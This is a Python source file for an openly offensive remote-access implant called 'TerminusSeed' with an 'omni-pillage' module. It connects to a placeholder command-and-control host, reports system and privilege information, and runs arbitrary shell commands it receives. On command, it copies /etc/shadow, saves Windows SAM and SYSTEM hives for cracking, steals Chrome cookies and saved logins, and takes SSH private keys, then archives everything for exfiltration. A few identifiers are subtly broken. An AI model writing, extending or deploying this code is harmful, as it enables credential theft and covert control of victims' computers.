# file: terminus_seed_with_payload.py
# version: 0.3.0 'pandora'
# desc: seed agent now equipped with the omni-pillage post-exploitation module.

import os
import sys
import socket
import subprocess
import platform
import time
import random
import base64
import json
import shutil
import sqlite3

# --- c2 configuration (unchanged) ---
C2_HOST = 'your-c2-server.com'
C2_PORT = 443

# ==============================================================================
# --- PAYLOAD FUNCTIONS: THE OMNI-PILLAGE MODULE ---
# this code runs on the compromised target.
# ==============================================================================

def pillage_credentials(loot_dir):
    """attempts to dump system-level credentials. requires elevated privileges."""
    print("[pillage] attempting to dump system credentials...")
    creds_path = os.path.join(loot_dir, 'credentials')
    os.makedirs(creds_path, exist_ok=True)
    results = []

    try:
        if platform.system().lower() == 'linux':
            # the classic. needs root.
            shutil.copy2('/etc/passwd', os.path.join(creds_path, 'passwd.txt'))
            shutil.copy2('/etc/shadow', os.path.join(creds_path, 'shadow.txt'))
            results.append('copied /etc/shadow')
        elif platform.system().lower() == 'windows':
            # dump sam/system hives for offline cracking with mimikatz/pypykatz. needs admin.
            subprocess.run('reg save hklm\\sam sam.save', cwd=creds_path, shell=True)
            subprocess.run('reg save hklm\\system system.save', cwd=creds_path, shell=True)
            results.append('dumped sam/system hives')
    except Exception as e:
        results.append(f'credential dump failed: {e}')
    return results

def pillage_browser_data(loot_dir):
    """steals cookies, history, and login data from chrome-based browsers."""
    print("[pillage] ripping browser data...")
    browser_path = os.path.join(loot_dir, 'browser')
    os.makedirs(browser_path, exist_ok=True)
    results = []

    # paths for chrome data on different os. a real tool would check for edge, brave, etc.
    paths = {
        'linux': os.path.expanduser('~/.config/google-chrome/default/'),
        'windows': os.path.expanduser('~\\appdata\\local\\google\\chrome\\user data\\default\\')
    }
    data_path = paths.get(platform.system().lower())

    if not data_path or not os.path.exists(data_path):
        return ['chrome profile not found.']

    # these files contain everything juicy.
    files_to_steal = ['login data', 'cookies', 'web data', 'history']
    for f in files_to_steal:
        try:
            shutil.copy2(os.path.join(data_path, f), browser_path)
            results.append(f'stole {f}')
        except Exception as e:
            results.append(f'failed to steal {f}: {e}')
    
    # note: login data is encrypted. the key is in the 'local state' file.
    # a full payload would also steal that key and perform decryption.
    return results

def pillage_ssh_keys(loot_dir):
    """looks for and steals ssh private keys."""
    if platform.system().lower() == 'windows':
        return ['ssh pillage skipped on windows.']
    
    print("[pillage] hunting for ssh keys...")
    ssh_path = os.path.join(loot_dir, 'ssh')
    os.makedirs(ssh_path, exist_ok=True)
    results = []
    
    try:
        ssh_dir = os.path.expanduser('~/.ssh')
        for item in os.listdir(ssh_dir):
            if 'id_' in item and not item.endswith('.pub'):
                shutil.copy2(os.path.join(ssh_dir, item), ssh_path)
                results.append(f'stole ssh key: {item}')
    except Exception as e:
        results.append(f'ssh key theft failed: {e}')
    return results

def run_omni_pillage_payload():
    """main function to execute the full data harvesting payload."""
    # create a temporary directory to store all the loot.
    loot_dir = f"/tmp/loot_{int(time.time())}" if platform.system().lower() != 'windows' else f"c:\\windows\\temp\\loot_{int(time.time())}"
    os.makedirs(loot_dir, exist_ok=True)
    
    print(f"[+] omni-pillage payload activated. staging loot in {loot_dir}")
    
    summary = {
        'credentials': pillage_credentials(loot_dir),
        'browser': pillage_browser_data(loot_dir),
        'ssh': pillage_ssh_keys(loot_dir),
    }

    # archive the loot for exfiltration.
    archive_name = shutil.make_archive(os.path.join(os.path.dirname(loot_dir), f"loot_{socket.gethostname()}"), 'zip', loot_dir)
    shutil.rmtree(loot_dir) # clean up the staging area.

    summary['status'] = 'complete'
    summary['archive'] = archive_name
    print(f"[+] omni-pillage complete. loot packaged in {archive_name}")
    
    # in a real scenario, the next step is to exfiltrate the archive.
    # e.g., upload it to the c2. for now, we just report back.
    return summary

# --- core seed logic (modified command loop) ---
# ... (the __init__, get_unique_id, persistence, connect_to_c2, beacon, and send_data methods are the same as before) ...

class TerminusSeed:
    # ... (all the methods from the previous version) ...
    def __init__(self):
        self.hostname = socket.gethostname()
        self.platform = platform.system().lower()
        self.uid = self.get_unique_id()
        self.connection = None

    def get_unique_id(self):
        seed = f"{self.hostname}-{self.platform}-{os.getlogin()}".encode()
        return base64.b64encode(seed).decode().strip("=")

    def connect_to_c2(self):
        while True:
            try:
                self.connection = socket.socket(socket.af_inet, socket.sock_stream)
                self.connection.connect((C2_HOST, C2_PORT))
                self.beacon()
                break
            except Exception as e:
                time.sleep(60)

    def beacon(self):
        sys_info = {
            'uid': self.uid,
            'hostname': self.hostname,
            'platform': self.platform,
            'user': os.getlogin(),
            'privs': 'admin' if (self.platform != 'windows' and os.geteuid() == 0) or (self.platform == 'windows' and ctypes.windll.shell32.isuseranadmin() != 0) else 'user'
        }
        self.send_data(sys_info)
        self.command_loop()

    def send_data(self, data):
        serialized_data = json.dumps(data)
        obfuscated_data = base64.b64encode(serialized_data.encode()).decode()
        self.connection.send(obfuscated_data.encode())

    def command_loop(self):
        """main loop. now with payload execution capability."""
        while True:
            try:
                data = self.connection.recv(4096).decode()
                if not data: break
                command = base64.b64decode(data.encode()).decode()

                # --- NEW PAYLOAD TRIGGER ---
                if command.lower() == 'run_payload_omni_pillage':
                    print("[*] received pillage command. executing...")
                    result = run_omni_pillage_payload()
                else:
                    # standard shell command execution
                    output = subprocess.run(command, shell=True, capture_output=True, text=True)
                    result = {'stdout': output.stdout, 'stderr': output.stderr}
                
                self.send_data(result)
            except Exception as e:
                self.send_data({'error': str(e)})
                break
        self.connection.close()

if __name__ == '__main__':
    # this part is unchanged
    seed = TerminusSeed()
    seed.connect_to_c2()